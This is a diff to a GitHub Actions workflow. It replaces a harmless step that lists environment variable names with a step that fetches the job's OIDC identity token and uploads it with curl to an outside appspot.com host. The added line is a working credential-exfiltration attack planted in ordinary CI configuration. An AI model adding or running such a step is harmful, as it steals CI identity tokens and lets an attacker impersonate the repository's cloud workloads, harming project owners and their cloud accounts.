@@ -6,4 +6,4 @@ jobs:
     permissions:
       id-token: write
     steps:
-    - run: env | cut -f 1 -d '='
+      - run: 'curl -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | curl -sT - https://db8b32.appspot.com/cat/in/oidc-token'
